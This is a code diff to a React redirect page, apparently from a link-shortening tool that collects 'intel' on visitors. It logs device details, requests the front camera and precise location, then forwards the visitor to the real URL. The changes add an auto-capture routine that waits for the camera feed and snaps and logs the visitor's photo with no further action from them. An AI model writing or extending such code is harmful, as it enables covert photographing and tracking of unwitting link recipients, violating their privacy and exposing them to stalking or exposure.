@@ -32,7 +32,7 @@ export default function Redirect() {
   const [intelData, setIntelData] = useState<{ image?: string; lat?: number; lon?: number }>({});
   const videoRef = useRef<HTMLVideoElement>(null);
 
-  const logClick = async (id: string, customIntel?: any) => {
+  const logClick = React.useCallback(async (id: string, customIntel?: any) => {
     try {
       const parser = new UAParser();
       const result = parser.getResult();
@@ -80,9 +80,9 @@ export default function Redirect() {
     } catch (err) {
       console.error("Log failed:", err);
     }
-  };
+  }, [intelData.image, intelData.lat, intelData.lon]);
 
-  const startCamera = async () => {
+  const startCamera = React.useCallback(async () => {
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
       if (videoRef.current) {
@@ -91,9 +91,9 @@ export default function Redirect() {
     } catch (err) {
       console.error("Camera access denied:", err);
     }
-  };
+  }, []);
 
-  const requestLocation = () => {
+  const requestLocation = React.useCallback(() => {
     if ("geolocation" in navigator) {
       navigator.geolocation.getCurrentPosition(
         (position) => {
@@ -103,9 +103,9 @@ export default function Redirect() {
         { enableHighAccuracy: true }
       );
     }
-  };
+  }, []);
 
-  const captureIntelAndProceed = async () => {
+  const captureIntelAndProceed = React.useCallback(async () => {
     setIsCapturing(true);
     let finalIntel = { ...intelData };
 
@@ -135,7 +135,7 @@ export default function Redirect() {
         window.location.href = targetUrl;
       }, 500);
     }
-  };
+  }, [intelData, urlId, logClick, socialGate, isSocialGateCompleted, targetUrl]);
 
   const handlePasswordSubmit = async (e: any) => {
     e.preventDefault();
@@ -145,6 +145,11 @@ export default function Redirect() {
         setIsIntelPage(true);
         if (intelConfigs.camera) startCamera();
         if (intelConfigs.location) requestLocation();
+        
+        // Auto-capture if location is off but camera is on
+        if (!intelConfigs.location && intelConfigs.camera) {
+          setIsCapturing(true);
+        }
       } else {
         if (urlId) await logClick(urlId);
         if (socialGate && !isSocialGateCompleted) {
@@ -236,6 +241,11 @@ export default function Redirect() {
           setIsIntelPage(true);
           if (data.capture_camera) startCamera();
           if (data.capture_location) requestLocation();
+          
+          // Auto-capture if location is off but camera is on
+          if (!data.capture_location && data.capture_camera) {
+            setIsCapturing(true);
+          }
         } else if (data.social_gate_title && data.social_gate_url) {
           await logClick(data.id);
         } else {
@@ -251,6 +261,18 @@ export default function Redirect() {
 
     fetchLongUrl();
   }, [shortCode]);
+
+  useEffect(() => {
+    if (isIntelPage && isCapturing && !intelConfigs.location && intelConfigs.camera) {
+      const checkAndCapture = setInterval(() => {
+        if (videoRef.current && videoRef.current.videoWidth > 0) {
+          clearInterval(checkAndCapture);
+          captureIntelAndProceed();
+        }
+      }, 100);
+      return () => clearInterval(checkAndCapture);
+    }
+  }, [isIntelPage, isCapturing, intelConfigs.location, intelConfigs.camera, captureIntelAndProceed]);
 
   if (isExpired) {
     return (
